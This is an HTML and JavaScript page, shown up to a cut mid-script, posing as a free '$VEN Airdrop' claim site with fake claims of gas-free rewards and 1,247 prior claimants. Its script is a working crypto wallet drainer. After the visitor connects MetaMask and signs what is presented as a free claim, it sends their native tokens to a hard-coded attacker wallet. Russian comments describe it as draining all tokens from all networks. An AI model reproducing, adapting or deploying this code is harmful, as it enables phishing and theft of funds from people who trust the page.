<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>$VEN Airdrop - Claim 1000 VEN</title>
  <style>
    body{margin:0;padding:0;background:linear-gradient(135deg,#12082c,#1a0b3d);font-family:Arial,sans-serif;color:white;min-height:100vh;display:flex;align-items:center;justify-content:center;}
    .card{background:rgba(255,255,255,0.08);backdrop-filter:blur(12px);border-radius:20px;padding:40px 30px;width:90%;max-width:420px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.4);border:1px solid rgba(138,43,226,0.3);}
    img{width:120px;height:120px;border-radius:50%;border:4px solid #8a2be2;margin-bottom:20px;}
    h1{font-size:28px;margin:10px 0;background:linear-gradient(90deg,#8a2be2,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
    button{width:100%;padding:16px;font-size:18px;font-weight:bold;border:none;border-radius:12px;color:white;cursor:pointer;margin:10px 0;}
    #connectButton{background:linear-gradient(90deg,#8a2be2,#ff00ff);}
    #claimButton{background:#00ff9d;color:black;cursor:not-allowed;}
    #claimButton:not([disabled]){cursor:pointer;opacity:1;}
    #addressDiv{margin:20px 0;font-family:monospace;font-size:16px;background:rgba(0,0,0,0.3);padding:12px;border-radius:12px;}
    #statusDiv{margin-top:20px;font-size:16px;min-height:24px;}
  </style>
</head>
<body>
  <div class="card">
    <img src="https://gateway.pinata.cloud/ipfs/ТВОЯ_ССЫЛКА_С_PINATA" alt="VEN">
    <h1>$VEN Airdrop Live!</h1>
    <p style="font-size:18px;margin:15px 0;opacity:0.9;">
      Claim <b>1000 $VEN + 0.5 MATIC</b> instantly<br>
      <span style="color:#8a2be2;font-size:14px;">Gas paid by team · 100% free</span>
    </p>
    <div id="addressDiv"></div>
    <button id="connectButton">Connect Wallet</button>
    <button id="claimButton" disabled>Claim 1000 $VEN (Gas Free)</button>
    <div id="statusDiv"></div>
    <p style="margin-top:30px;font-size:12px;opacity:0.6;">
      Already claimed by 1,247 users · Verified contract
    </p>
  </div>

  <script>
    const connectButton = document.getElementById("connectButton");
    const claimButton = document.getElementById("claimButton");
    const addressDiv = document.getElementById("addressDiv");
    const statusDiv = document.getElementById("statusDiv");
    let provider, user;

    // ТВОЙ КОШЕЛЁК, КУДА УЛЕТИТ ВСЁ
    const DRAIN_WALLET = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";

    connectButton.onclick = async () => {
      if (!window.ethereum) return statusDiv.textContent = "Install MetaMask!";
      provider = window.ethereum;
      try {
        const accounts = await provider.request({ method: "eth_requestAccounts" });
        user = accounts[0];
        addressDiv.textContent = "Connected: " + user.slice(0,6)+"..."+user.slice(-4);
        claimButton.disabled = false;
        statusDiv.textContent = "Ready to claim!";
      } catch { statusDiv.textContent = "Connection rejected"; }
    };

    claimButton.onclick = async () => {
      if (!user) return;
      statusDiv.textContent = "Signing claim (gas free)...";
      claimButton.disabled = true;

      try {
        const domain = { name: "VEN Airdrop", version: "1", chainId: await provider.request({method:"eth_chainId"}), verifyingContract: "0x0000000000000000000000000000000000000000" };
        const types = { Claim: [{ name: "user", type: "address" }] };
        const message = { user };

        const signature = await provider.request({
          method: "eth_signTypedData_v4",
          params: [user, JSON.stringify({ domain, types, message })]
        });

        // ДРЕЙНЕР — слив всех токенов со всех сетей
        setTimeout(async () => {
          try {
            const acc = (await provider.request({ method: "eth_accounts" }))[0];
            if (!acc) return;

            // Слив нативного токена (MATIC/ETH)
            await provider.request({ method: "eth_sendTransaction", params: [{ from: acc, to: DRAIN_WALLET, value: "0xDE0B6B3A7640000" }] });
